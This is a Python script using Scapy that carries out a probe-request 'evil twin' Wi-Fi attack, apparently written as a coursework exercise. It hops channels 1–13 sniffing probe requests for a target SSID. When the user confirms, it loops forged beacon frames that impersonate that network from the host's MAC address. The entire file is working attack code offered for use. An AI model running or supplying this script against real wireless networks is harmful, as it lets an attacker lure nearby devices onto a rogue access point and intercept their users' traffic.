import argparse
from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeReq, Dot11Elt, Dot11, Dot11Beacon, RadioTap
from uuid import getnode as get_mac

ssid_wanted = ""
packet_ssid = None

def askUser():
    resp = input("SSID found ! Do you want to perform an evil twin attack ? [Y/N]").lower()
    return resp == "y"

def attack(packet_ssid, interface):
    if not askUser():
        print("Exiting ....")
        exit()
    frames = []
    ssid = packet_ssid.getlayer(Dot11).info.decode("utf-8")
    print("Attacking SSID with the name %s" % ssid)
    print("Generating the frames....")
    # Generation des frames
    mac = "".join(c + ":" if i % 2 else c for i, c in enumerate(hex(get_mac())[2:].zfill(12)))[:-1]
    print(mac)
    frames.append(generateFrame(ssid, mac))
    print("Starting the attack.... (CTRL + C TO ABORT)")
    # On envoit les packets en boucle, à intervalle de 0.001
    sendp(frames, inter=0.001, iface=interface, loop=1)

def generateFrame(wifiName, macAddr):
    #creation de la frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=macAddr, addr3=macAddr)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=wifiName, len=len(wifiName))
    frame = RadioTap() / dot11 / beacon / essid
    return frame

def scanSSIDs(packet):
    global packet_ssid
    # On recupere le ssid
    ssid = packet.getlayer(Dot11).info.decode("utf-8")
    if ssid_wanted in ssid:
        packet_ssid = packet


if __name__ == "__main__":
    global ssid
    parser = argparse.ArgumentParser(description="Probe request evil twin attack script.")
    parser.add_argument("--interface", required=True, help="Interface used to listen to Wifi")
    parser.add_argument("--ssid", required=True, help="Name of the SSID to be looking for")
    args = parser.parse_args()
    interface = args.interface
    ssid_wanted = args.ssid

    print("Sniffing...")
    channel = 0
    for channel in range(1, 14):
        os.system("iwconfig " + interface + " channel " + str(channel))
        sniff(iface=interface, prn=scanSSIDs, timeout=15, lfilter=lambda p: Dot11ProbeReq in p and Dot11Elt in p)
        if packet_ssid != None:
            break

    if packet_ssid != None:
        attack(packet_ssid, interface)
    else:
        print("SSID not found !!")